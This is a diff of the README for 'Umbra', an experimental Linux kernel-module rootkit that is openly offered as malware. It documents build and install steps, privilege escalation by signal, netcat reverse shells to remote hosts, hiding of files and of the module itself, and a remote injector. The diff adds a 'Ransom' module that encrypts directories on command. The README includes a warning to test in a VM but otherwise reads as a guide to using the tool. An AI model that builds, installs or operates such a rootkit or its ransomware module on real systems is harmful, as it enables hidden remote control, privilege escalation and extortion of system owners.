@@ -5,27 +5,33 @@
 
 # Umbra <img src="images/umbraicon2.png" float="right" width = 50>
 
-Umbra (/ˈʌmbrə/) is an experimental LKM rootkit for kernels 4.x and 5.x (up to 5.7) which opens a network backdoor that spawns reverse shells to remote hosts and more.
+Umbra is an experimental remotely controllable LKM rootkit for kernels 4.x and 5.x (up to 5.7) which opens a network backdoor that can spawn reverse shells to remote hosts, launch malware remotely and much more. 
 
 The rootkit is still under development, although the features listed below are already fully operational.
 
-![Backdoor in action](https://github.com/h3xduck/Umbra/blob/master/images/umbra3.gif)
+![Backdoor in action](https://github.com/h3xduck/Umbra/blob/master/images/umbra4.0_1.gif)
 
 Note: This rootkit has been developed and tested using kernel 5.4.0 and Ubuntu 18.04.
 
 ## Features
 * :star2: Backdoor which spawns reverse shell to remote IP after receiving a malicious TCP packet.
+* :star2: Use the *Umbra Injector* to control the rootkit remotely:
+  * Remote reverse shell.
+  * Hide/unhide rootkit remotely.
+  * Launch *Umbra Modules*.
+    
+<img src="images/umbrainjectorwithmodules.png" width = 800/>
+
+* **NEW:** Added the ***Umbra Modules***, special malware-like modules which enhance Umbra and can be launched remotely by the Umbra Injector.
+* **NEW:** Umbra module "***Ransom***" which turns Umbra into a remotely controllable ransomware.
+
+![Ransom module in action](https://github.com/h3xduck/Umbra/blob/master/images/umbra4.0_2.gif)
+
+* Umbra hides all its files and directories from user commands such as *ls*.
+* Umbra can hide/unhide itself remotely and locally via signals.
 * Privilege escalation by sending signal 50.
 * Spawn netcat reverse shell on module load.
 * Spawn netcat reverse shell to a remote host by sending signal 51.
-* **NEW**: Added the *Umbra Injector* to control the rootkit remotely:
-  * Remote reverse shell.
-  * Hide/unhide rootkit remotely.
-    
-<img src="images/umbrainjector.png" width = 800/>
-
-* **NEW**: Umbra hides all its files and directories from user commands such as *ls*.
-* **NEW**: Umbra can hide/unhide itself remotely and locally via signals.
 
 More functionalities will come in later updates.
 
@@ -36,12 +42,16 @@ Also bear in mind that Umbra only incorporates light hiding and protection mecha
 
 **IMPORTANT:** If you are going to test this rootkit in your own machine, I *strongly recommend* to use a VM. 
 
+**About the Umbra Modules:** The *ransom* module uses a trivial encryption mechanism but it can and will certainly encrypt any folder in your machine. Although files can be easily decrypted, I *definitely do not recommend* running this towards your root folder or similar unless on a controlled environment.
+
 ## Table of Contents
 1. [Build and Install](#build-and-install)
 2. [Unloading Umbra](#unloading-umbra)
 3. [Local Control](#basic-usage-local-control)
 4. [Remote Control](#umbra-injector-remote-control)
-5. [References](#references)
+5. [Umbra Modules](#umbra-modules)
+   * [(NEW) Ransom](#ransom-module)
+6. [References](#references)
 
 ## Build and install
 Remember that you should have a 4.x or 5.x kernel available.
@@ -49,7 +59,7 @@ Remember that you should have a 4.x or 5.x kernel available.
 ```sh
 apt install linux-headers-$(uname -r)
 ```
-2.Configure your include path to cover the kernel header directory (usually under /usr/src). If you are using vscode, you can check ```.vscode/c_cpp_properties.json``` for an example on which directories to include.
+2. Configure your include path to cover the kernel header directory (usually under /usr/src). If you are using vscode, you can check ```.vscode/c_cpp_properties.json``` for an example on which directories to include.
 
 3. Clone the project
 ```
@@ -60,12 +70,22 @@ cd Umbra
 ```
 make
 ```
-5. Load Umbra in the kernel
+5. Load Umbra in the kernel and configure environment
+The script will install Umbra in the kernel and configure a special directory where to store the malware modules. The directory will be later hidden by the rootkit.
+
+```
+sudo ./install.sh
+```
+
+If you have previously run the script and wish to just install Umbra in the kernel, you can run:
+
 ```
 sudo insmod ./umbra.ko
 ```
 
 ## Unloading Umbra
+Make sure Umbra is not in invisible mode, otherwise this will fail.
+
 ```
 sudo rmmod umbra
 ```
@@ -108,23 +128,23 @@ kill -52 1
 ### Unhide the rootkit
 This reverts the invisible mode if active.
 ```
-./client -53 127.0.0.1
+kill -53 1
 ```
 
 ## Umbra Injector: Remote control
-### **NEW**: Get reverse shell
+### Get reverse shell
 The program can be run either before Umbra is installed (thus waiting until it is), or after Umbra is installed on the target system.
 ```
-./client -S 127.0.0.1
+./injector -S 127.0.0.1
 ```
 
-### **NEW**: Hide the rootkit remotely - Invisible mode
+### Hide the rootkit remotely - Invisible mode
 This will prevent the rootkit from being shown by commands such as *lsmod*, or being removed via *rmmod*.
 ```
-./client -i 127.0.0.1
+./injector -i 127.0.0.1
 ```
 
-### **NEW**: Unhide the rootkit remotely
+### ¡Unhide the rootkit remotely
 This reverts the invisible mode if active.
 ```
 ./client -u 127.0.0.1
@@ -133,10 +153,23 @@ This reverts the invisible mode if active.
 ### Help
 You can see the full information on how to run the client by:
 ```
-./client -h
+./injector -h
 ```
 
+## Umbra Modules
+### Ransom module
+This module can launch remote ransomware-like attacks via the Umbra Injector. Encrypted files appear with the *.ubr* extension.
 
+Currently the encryption mechanism is a simple bit-level NOP, as a proof of concept. You may edit the module to include your own encryption algorithm.
+#### Encrypt a directory and all its sub-directories
+```
+./injector -p /Your/Path/To/Encrypt -e 127.0.0.1
+```
+
+#### Decrypt a directory and all its sub-directories
+```
+./injector -p /Your/Path/To/Decrypt -d 127.0.0.1
+```
 
 ## References
 The development of this rootkit involved a substantial amount of research about LKMs and rootkit techniques. The following is an incomplete list of the resources I used:
